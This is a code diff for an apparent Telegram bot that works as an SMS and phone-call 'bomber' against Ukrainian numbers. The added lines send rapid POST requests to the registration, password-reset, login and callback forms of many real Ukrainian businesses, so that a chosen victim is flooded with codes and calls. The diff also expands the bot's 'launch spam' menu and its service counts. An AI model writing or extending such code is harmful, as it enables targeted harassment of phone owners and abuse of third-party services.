@@ -228,6 +228,14 @@ def send_for_number_sms(aa):
         sms = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
         time.sleep(0.4)
         sms = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        sms = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
+        time.sleep(0.4)
+        sms = requests.post('https://odrex.top/api/sms',headers=headers,json={"phone": aa,"sms_code_type": "random","type": "registration"})
+        time.sleep(0.4)
+        sms = requests.post('https://auth2.multiplex.ua/login',headers=headers,json={"login": aa})
+        time.sleep(0.4)
+        sms = requests.post('https://samsonite.ua/auth/loginbyphone',headers=headers,data={'phone': '+'+aa[:2] + ' ' + aa[2:5] + ' ' + aa[5:8]+ '-' + aa[8:10]+ '-' +aa[10:12],'code': ''})
     except:
         pass
     print('все')
@@ -345,6 +353,14 @@ def send_for_number_call(aa):
         call = requests.post('https://protein-max.com.ua/ajaxrequest',headers=headers,data={'mguniqueurl': 'action/sendOrderRing','pluginHandler': 'back-ring','name': 'name','comment': '','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','city_id': '','mission': '','date_callback': '','time_callback': '','invisible': '1','status_id': '1','pub': '1','capcha': ''})
         time.sleep(0.4)
         call = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_W5DgT','isAjax': '1','unique_id': 'W5DgT'})
+        time.sleep(0.4)
+        call = requests.post(f'https://omegamc.ua/recallme.php',headers=headers,data={'name': name,'tel': f'+{aa[:3]}({aa[3:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}'})
+        time.sleep(0.4)
+        call = requests.post('https://likarni.com/call',headers=headers,data={'callback[partner_id]': '','callback[telephone]': aa,'callback[description]': ''})
+        time.sleep(0.4)
+        call = requests.post('https://eventmaster.com.ua/api/FormRequest/SendGetCallRequest',headers=headers,data={'name': name,'phone': number_plus,'message': '','isMobile': ''})
+        time.sleep(0.4)
+        call = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
     except:
         pass
     print('все')
@@ -587,6 +603,21 @@ def send_for_number_mix(aa):
         d = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
         time.sleep(0.4)
         d = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        time.sleep(0.4)
+        sms = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
+        time.sleep(0.4)
+        sms = requests.post('https://odrex.top/api/sms',headers=headers,json={"phone": aa,"sms_code_type": "random","type": "registration"})
+        time.sleep(0.4)
+        sms = requests.post('https://auth2.multiplex.ua/login',headers=headers,json={"login": aa})
+        time.sleep(0.4)
+        sms = requests.post('https://samsonite.ua/auth/loginbyphone',headers=headers,data={'phone': '+'+aa[:2] + ' ' + aa[2:5] + ' ' + aa[5:8]+ '-' + aa[8:10]+ '-' +aa[10:12],'code': ''})
+        time.sleep(0.4)
+        call = requests.post(f'https://omegamc.ua/recallme.php',headers=headers,data={'name': name,'tel': f'+{aa[:3]}({aa[3:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}'})
+        time.sleep(0.4)
+        call = requests.post('https://likarni.com/call',headers=headers,data={'callback[partner_id]': '','callback[telephone]': aa,'callback[description]': ''})
+        time.sleep(0.4)
+        call = requests.post('https://eventmaster.com.ua/api/FormRequest/SendGetCallRequest',headers=headers,data={'name': name,'phone': number_plus,'message': '','isMobile': ''})
+        time.sleep(0.4)
     except:
         pass
     print('все')
@@ -686,26 +717,23 @@ def handle_message_received(message: types.Message):
         text = message.text
         name = message.from_user.first_name
         user_id = message.from_user.id
-        
 
         if text == '💬Запуск спама':
             save_chat_id(chat_id)
             bot.send_message(chat_id, '<b>Введи номер без + в форматі:\n🇺🇦 380xxxxxxxxx seconds</b>\n\nПриклад: 380000000000 50', parse_mode='HTML')
 
+        elif text == '📊Статистика':
+            save_chat_id(chat_id)
+            bot.send_message(chat_id, f'📊<b>Статистика відображенна в реальному часі</b>: \n\n📕В боті {users_amount[0]} користувачів.\n☎️Call сервісів: 43\n💬SMS сервісів: 58', parse_mode='HTML')
 
         elif 'Додати' in text and text.split()[1] not in black:
             black_list_add(text.split()[1])
-
                 
         elif text == 'БД' and chat_id==ADMIN_CHAT_ID:
             bot.send_document(chat_id,open('chat_ids.txt', 'rb'))
             
         elif text == 'ЧС' and chat_id==ADMIN_CHAT_ID:
             bot.send_document(chat_id,open('black_list.txt', 'rb'))
-            
-        elif text == '📊Статистика':
-            save_chat_id(chat_id)
-            bot.send_message(chat_id, f'📊<b>Статистика відображенна в реальному часі</b>: \n\n📕В боті {users_amount[0]} користувачів.\n☎️Call сервісів: 39\n💬SMS сервісів: 54', parse_mode='HTML')
 
         elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
             save_chat_id(chat_id)
@@ -736,8 +764,7 @@ def handle_message_received(message: types.Message):
                 else:
                     spam_handler(num, chat_id,sec,name,user_id)
             else:
-                bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380') 
-
+                bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380')
         else:
             save_chat_id(chat_id)
             bot.send_message(chat_id, f'Номер введений неправильно. Введено {len(text)} символів, а треба 12')
